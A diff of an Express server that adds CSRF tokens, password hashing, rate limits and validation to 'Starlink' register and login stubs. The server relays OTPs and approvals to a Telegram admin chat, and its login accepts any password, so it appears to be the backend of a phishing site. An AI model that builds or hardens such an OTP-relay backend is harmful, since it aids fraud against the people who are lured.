@@ -2,12 +2,49 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const bodyParser = require('body-parser');
+const crypto = require('crypto');
 require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
 const { createApprovalRequest, submitOtp, submitLink, getApprovalStatus, approvals } = require('./telegram-bot');
 const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog, createSession } = require('./security');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+// ── CSRF Protection ──────────────────────────────────────────
+const csrfStore = new Map();
+
+function generateCsrfToken(sessionId) {
+    const token = crypto.randomBytes(32).toString('hex');
+    csrfStore.set(token, { sessionId, createdAt: Date.now() });
+    // Clean up expired tokens
+    setTimeout(() => csrfStore.delete(token), 3600000); // 1 hour
+    return token;
+}
+
+function validateCsrfToken(sessionId, token) {
+    const data = csrfStore.get(token);
+    if (!data) return false;
+    if (data.sessionId !== sessionId) return false;
+    if (Date.now() - data.createdAt > 3600000) { // 1 hour
+        csrfStore.delete(token);
+        return false;
+    }
+    return true;
+}
+
+// ── Password Hashing ──────────────────────────────────────────
+function hashPassword(password) {
+    const salt = crypto.randomBytes(16).toString('hex');
+    const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
+    return salt + ':' + hash;
+}
+
+function verifyPassword(password, hashedPassword) {
+    const [salt, hash] = hashedPassword.split(':');
+    if (!salt || !hash) return false;
+    const computedHash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
+    return computedHash === hash;
+}
 
 // Validate critical secrets on startup
 const requiredSecrets = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_ADMIN_CHAT_ID'];
@@ -240,14 +277,57 @@ app.post('/api/admin/mtn-unverify', validateApiSecret, (req, res) => {
 });
 
 // ── Auth stub endpoints (for register/login pages) ──────────────
-app.post('/api/starlink/register', (req, res) => {
-    const { phone, password, fullName } = req.body;
-    console.log('Register attempt:', { phone, fullName });
+app.post('/api/starlink/register', rateLimit({ maxRequests: 5, windowMs: 60000 }), (req, res) => {
+    const { phone, password, fullName, csrfToken } = req.body;
+    
+    // CSRF validation
+    const sessionId = req.headers['x-session-id'] || req.query.sessionId;
+    if (!sessionId || !validateCsrfToken(sessionId, csrfToken)) {
+        return res.status(403).json({ success: false, message: 'Invalid CSRF token' });
+    }
+    
+    // Validate inputs
+    if (!phone || !password || !fullName) {
+        return res.status(400).json({ success: false, message: 'All fields are required' });
+    }
+    
+    if (!validator.name(fullName)) {
+        return res.status(400).json({ success: false, message: 'Invalid name format' });
+    }
+    
+    if (!validator.phone(phone)) {
+        return res.status(400).json({ success: false, message: 'Invalid phone number format. Use +254 format' });
+    }
+    
+    if (!validator.password(password)) {
+        return res.status(400).json({ success: false, message: 'Password must be at least 6 characters' });
+    }
+    
+    // Hash password
+    const hashedPassword = hashPassword(password);
+    
+    console.log('Register attempt:', { phone, fullName, hashedPassword });
     res.json({ success: true, message: 'Registration successful', phone, name: fullName });
 });
 
-app.post('/api/starlink/login', (req, res) => {
-    const { phone, password } = req.body;
+app.post('/api/starlink/login', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
+    const { phone, password, csrfToken } = req.body;
+    
+    // CSRF validation
+    const sessionId = req.headers['x-session-id'] || req.query.sessionId;
+    if (!sessionId || !validateCsrfToken(sessionId, csrfToken)) {
+        return res.status(403).json({ success: false, message: 'Invalid CSRF token' });
+    }
+    
+    // Validate inputs
+    if (!phone || !password) {
+        return res.status(400).json({ success: false, message: 'All fields are required' });
+    }
+    
+    if (!validator.phone(phone)) {
+        return res.status(400).json({ success: false, message: 'Invalid phone number format. Use +254 format' });
+    }
+    
     console.log('Login attempt:', { phone });
     res.json({ success: true, message: 'Login successful', phone, name: 'User' });
 });
